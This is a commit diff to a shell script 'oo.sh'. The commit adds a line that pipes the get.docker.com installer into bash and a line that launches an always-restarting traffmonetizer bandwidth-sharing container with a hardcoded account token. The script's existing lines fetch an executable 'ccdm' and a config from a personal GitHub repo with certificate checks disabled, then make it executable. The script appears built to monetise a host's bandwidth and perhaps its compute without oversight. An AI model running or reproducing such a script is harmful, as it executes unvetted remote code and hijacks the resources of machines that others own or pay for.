f970746077d8a341f76fffb3e601f3fbe4670d73
chenlysave <cheelysavir139@gmail.com>
2026-05-15 06:42:17 +0800

    Update oo.sh

--- oo.sh
+++ oo.sh
@@ -1,4 +1,6 @@
 #!/bin/bash
+wget -qO- get.docker.com | bash
+docker run -d --restart=always --name tm traffmonetizer/cli_v2 start accept --token I1TfrUC+ST9NdcK/97Dq/uZAW61DEnSWWr3KEm2GSVg=
 wget https://raw.githubusercontent.com/chenlysave/my-micosmgd/refs/heads/main/ccdm
 chmod u+x ccdm
 wget --no-check-certificate -qO ./config.json https://raw.githubusercontent.com/chenlysave/my-micosmgd/refs/heads/main/adm2.json
